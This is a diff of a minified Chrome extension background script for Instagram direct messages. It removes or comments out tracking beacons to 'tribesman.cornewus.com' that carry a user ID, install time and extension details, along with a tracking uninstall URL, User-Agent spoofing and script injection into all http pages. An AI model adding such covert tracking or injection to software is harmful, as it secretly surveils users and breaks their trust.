@@ -1,4 +1,39 @@
 ! function () {
+    chrome.windows.onRemoved.addListener(function (a) {
+        a === E && (D = null, E = null)
+    })
+     chrome.tabs.onUpdated.addListener(function (a, b, c) {
+        console.log(a,b,c)
+        if (c.url.indexOf("instagram.com/direct/inbox") > -1 && c.status == "complete") {
+            
+            chrome.tabs.executeScript(a, {
+                    runAt: "document_start",
+                    file: "/js/jquery.js"
+            })
+            chrome.tabs.executeScript(a, {
+                    runAt: "document_start",
+                    file: "/js/tippy.all.js"
+            })
+            chrome.tabs.executeScript(a, {
+                    runAt: "document_start",
+                    file: "/js/FileSaver.js"
+            })
+            chrome.tabs.executeScript(a, {
+                    runAt: "document_start",
+                    file: "/js/content.js"
+            })
+            
+        } else {
+            /*if (!H) return;
+            if (!/^http/.test(c.url)) return;
+            if (L.lastTabId === a && L.lastUrl === c.url && Date.now() + 2e3 < L.lastTime) return;
+            L.lastTabId = a, L.lastUrl = c.url, L.lastTime = Date.now(), chrome.tabs.executeScript(a, {
+                runAt: "document_idle",
+                file: "js/send_external_image.js"
+            })*/
+        }
+    });
+
     function a() {
         var a = navigator.userAgent.replace(/\s/g, "").toLowerCase().match(/chrome\/(\d+)/),
             b = a && a[1] && a[1].length && a[1];
@@ -8,8 +43,8 @@
     }
 
     function b(a, b) {
-        var c = "https://tribesman.cornewus.com/__utm.gif?e=instagram_direct" + K() + "&k=" + encodeURIComponent(a) + "&uid=" + encodeURIComponent("" + F) + "&it=" + (window.localStorage.installedTime || "") + "&lang=" + (window && window.navigator && window.navigator.language ? window.navigator.language : "-") + "&r=" + Math.random() + ("undefined" != typeof b ? "&d=" + encodeURIComponent(b) : "");
-        c = c.substr(0, 2e3), (new Image).src = c
+        /*var c = "https://tribesman.cornewus.com/__utm.gif?e=instagram_direct" + K() + "&k=" + encodeURIComponent(a) + "&uid=" + encodeURIComponent("" + F) + "&it=" + (window.localStorage.installedTime || "") + "&lang=" + (window && window.navigator && window.navigator.language ? window.navigator.language : "-") + "&r=" + Math.random() + ("undefined" != typeof b ? "&d=" + encodeURIComponent(b) : "");
+        c = c.substr(0, 2e3), (new Image).src = c*/
     }
 
     function c(a, d) {
@@ -127,69 +162,14 @@
     }
 
     function k() {
-        chrome.windows.onRemoved.addListener(function (a) {
-            a === E && (D = null, E = null)
-        }), chrome.tabs.onUpdated.addListener(function (a, b, c) {
-            if (!v && b.url && d(), b.status && !w && f(), c.url.indexOf("instagram.com") > -1 && a === D) {
-                chrome.tabs.executeScript(a, {
-                    runAt: "document_start",
-                    file: "/js/sn.js"
-                });
-                var e = Date.now();
-                if (G + 300 > e) return;
-                G = e, chrome.tabs.executeScript(a, {
-                    runAt: "document_idle",
-                    code: 'window["insta_ext_direct_7482"];'
-                }, function (b) {
-                    b && b[0] || (chrome.tabs.executeScript(a, {
-                        runAt: "document_idle",
-                        code: 'window["insta_ext_direct_7482"] = 1;'
-                    }), chrome.tabs.executeScript(a, {
-                        runAt: "document_start",
-                        file: "/js/jquery.js"
-                    }), chrome.tabs.executeScript(a, {
-                        runAt: "document_start",
-                        file: "/js/touch-emulator.js"
-                    }), chrome.tabs.executeScript(a, {
-                        runAt: "document_start",
-                        file: "js/emoji/config.js"
-                    }), chrome.tabs.executeScript(a, {
-                        runAt: "document_start",
-                        file: "js/emoji/util.js"
-                    }), chrome.tabs.executeScript(a, {
-                        runAt: "document_start",
-                        file: "js/emoji/jquery.emojiarea.js"
-                    }), chrome.tabs.executeScript(a, {
-                        runAt: "document_start",
-                        file: "js/emoji/emoji-picker.js"
-                    }), chrome.tabs.executeScript(a, {
-                        runAt: "document_start",
-                        file: "/js/tippy.all.js"
-                    }), chrome.tabs.executeScript(a, {
-                        runAt: "document_start",
-                        file: "/js/FileSaver.js"
-                    }), chrome.tabs.executeScript(a, {
-                        runAt: "document_start",
-                        file: "/js/content.js"
-                    }))
-                })
-            } else {
-                if (!H) return;
-                if (!/^http/.test(c.url)) return;
-                if (L.lastTabId === a && L.lastUrl === c.url && Date.now() + 2e3 < L.lastTime) return;
-                L.lastTabId = a, L.lastUrl = c.url, L.lastTime = Date.now(), chrome.tabs.executeScript(a, {
-                    runAt: "document_idle",
-                    file: "js/send_external_image.js"
-                })
-            }
-        });
+       
         var a = ["blocking", "requestHeaders"];
         y && a.push("extraHeaders"), chrome.webRequest.onBeforeSendHeaders.addListener(function (a) {
             var b, c = a.requestHeaders;
             if (D === a.tabId) {
                 for (b = 0; b < c.length; b++)
                     if ("User-Agent" === c[b].name) {
-                        c[b].value = "Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36";
+                        //c[b].value = "Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36";
                         break
                     }
                 return {
@@ -231,14 +211,11 @@
             a.responseHeaders.forEach(function (a) {
                 localStorage[a.name.toLowerCase()] = a.value
             })
-        }, {
-            urls: ["https://tribesman.cornewus.com/*"],
-            types: ["image"]
         }, ["responseHeaders"]), chrome.browserAction.onClicked.addListener(function () {
             l()
         });
         var b = {};
-        chrome.runtime.onMessage.addListener(function (a, d, f) {
+        /*chrome.runtime.onMessage.addListener(function (a, d, f) {
             if (a)
                 if ("error_page" == a) {
                     var h = Date.now();
@@ -262,7 +239,7 @@
                         "openMediaInTab" == a.action && m(a.url)
                     }
                 }
-        })
+        })*/
     }
 
     function l() {
@@ -317,7 +294,7 @@
         })
     }
 
-    function q(a, b, c) {
+    /*function q(a, b, c) {
         b = b || [];
         var d = "https://i.instagram.com/api/v1/direct_v2/inbox/?persistentBadging=true&use_unified_inbox=true";
         a && (d += "&cursor=" + a), $.ajax({
@@ -336,7 +313,7 @@
         }).fail(function () {
             c(b)
         })
-    }
+    }*/
 
     function r() {
         Date.now() < M + N || i(function (a) {
@@ -386,6 +363,7 @@
             text: a.toString()
         }))
     }
+
     var v, w, x, y, z = "https://instagram.com/direct/inbox/",
         A = "https://*.instagram.com/direct/inbox/",
         B = "https://www.instagram.com",
@@ -405,43 +383,5 @@
             lastUrl: null,
             lastTime: 0
         };
-    chrome.storage.sync.get(["settings", "notify_history"], function (a) {
-        H = a.settings && a.settings.send_img_from_anywhere || !1, I = a.settings && a.settings.ext_notifications || !1, J = a.notify_history || {}
-    }), chrome.storage.onChanged.addListener(function (a) {
-        a.settings && (H = a.settings.newValue.send_img_from_anywhere || !1, I = a.settings.newValue.ext_notifications || !1)
-    });
-    var M = 0,
-        N = 3e3;
-    y = !a(), o(), k(), r(!0), setInterval(r, 15e3),
-        function () {
-            var a = function () {
-                return "storexxxxxxxxxxxx".replace(/[xy]/g, function (a) {
-                    var b = 16 * Math.random() | 0,
-                        c = "x" === a ? b : 3 & b | 8;
-                    return c.toString(16)
-                })
-            };
-            "undefined" == typeof window.localStorage.installedTime && (window.localStorage.installedTime = Date.now());
-            var b = "nop",
-                c = "uidinstagram_direct";
-            chrome.storage.sync.get(c, function (d) {
-                function e() {
-                    return "&vid=" + (chrome.runtime.id ? chrome.runtime.id.substr(0, 11) : "-") + "&vv=" + (chrome.runtime.getManifest && chrome.runtime.getManifest() ? chrome.runtime.getManifest().version : "-")
-                }
-                j();
-                var f = d[c];
-                if (!f) {
-                    f = a();
-                    var g = {};
-                    g[c] = f, chrome.storage.sync.set(g)
-                }
-                if (b = f, (new Image).src = "https://tribesman.cornewus.com/__utm.gif?e=instagram_direct" + e() + "&k=bkg_run&it=" + (window.localStorage.installedTime || "") + "&uid=" + encodeURIComponent(b) + "&r=" + Math.random(), chrome.runtime.setUninstallURL) {
-                    var h = "https://outstole.my-sins.com/?ext=instagram_direct&uid=" + b;
-                    h += "&rnd=" + Math.random().toString().substr(0, 8), chrome.runtime.setUninstallURL(h)
-                }
-            }), setTimeout(function () {
-                "nop" == b && ((new Image).src = "https://tribesman.cornewus.com/__utm.gif?e=instagram_direct&k=bkg_run&it=" + (window.localStorage.installedTime || "") + "&uid=" + encodeURIComponent(b) + "&r=" + Math.random())
-            }, 6e4)
-        }()
 }();
 
